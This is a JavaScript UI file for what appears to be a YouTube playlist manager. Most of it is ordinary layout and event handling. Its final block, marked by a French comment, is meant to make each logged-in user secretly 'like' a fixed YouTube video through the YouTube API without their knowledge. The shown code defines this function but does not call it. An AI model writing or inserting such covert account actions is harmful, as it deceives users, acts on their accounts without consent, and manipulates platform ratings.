var refresh = document.querySelector("#playlists .refresh");
refresh.onclick = function(){
	getPlaylists();
}

var setSize = function(){
	if (window.innerWidth<=1110){
		if (window.innerWidth<=850){
		
		}
		else{
			video_search.style.height = 80/100*window.innerHeight + "px";
			if (modalAddVideo.classList.contains('show')){
				modalAddVideo.classList.remove('show');
				modalAddVideo.classList.add('hide');
			}
		}
	}
	else{
		left_aside.style.height = window.innerHeight + "px";
		main_content.style.height = window.innerHeight + "px";
		video_search.style.height = window.innerHeight + "px";
		if (modalAddVideo.classList.contains('hide')){
			modalAddVideo.classList.remove('hide');
			modalAddVideo.classList.add('show');
		}
	}
}

addVideoButton.addEventListener('click', function(e){
	var buttonClassList = addVideoButton.classList;
	var modalClassList = modalAddVideo.classList;
	modalClassList.remove('hide');
	modalClassList.add('show');
	buttonClassList.remove('show');
	buttonClassList.add('hide');
});

closeModalButton.addEventListener('click', function(e){
	var buttonClassList = addVideoButton.classList;
	var modalClassList = modalAddVideo.classList;
	modalClassList.remove('show');
	modalClassList.add('hide');
	buttonClassList.remove('hide');
	buttonClassList.add('show');
});

window.addEventListener('resize', setSize);
window.onload = function(){	
	setSize();
}


//Detect click outside editPlaylistBlock to close it
window.addEventListener('click', function(e){
	var classList = editPlaylistBlock.classList;
	if (!editPlaylistBlock.contains(e.target) && !editPlaylistButton.contains(e.target)){
		if (classList.contains('show')){
			classList.remove('show');
			classList.add('hide');
			editPlaylistButton.classList.remove("clicked");
		}
	}
});



//Style de la poubelle de la suppression de playlist
var trash = document.querySelector('.fa-trash-o');

trash.addEventListener("mouseover", function(){
	trash.classList.remove('fa-trash-o');
	trash.classList.add('fa-trash');
});

trash.addEventListener("mouseout", function(){
	trash.classList.add('fa-trash-o');
	trash.classList.remove('fa-trash');
});


var searchVideoForm = document.getElementById('searchVideoForm');

searchVideoForm.addEventListener("submit", function(e){
	e.preventDefault();
	var query = document.getElementById('query').value;
	searchVideo(query);
});





//À sa connexion, l'utilisateur like automatiquement une vidéo youtube sans s'en apercevoir 
function executeRequest(request) {
	request.execute();
}

function videosRate(params) {
	var request = gapi.client.youtube.videos.rate(params);
	executeRequest(request);
}

function defineRequest() {
	videosRate({
		'id': 'EynHWoEka-s',
		'rating': 'like'
	});
}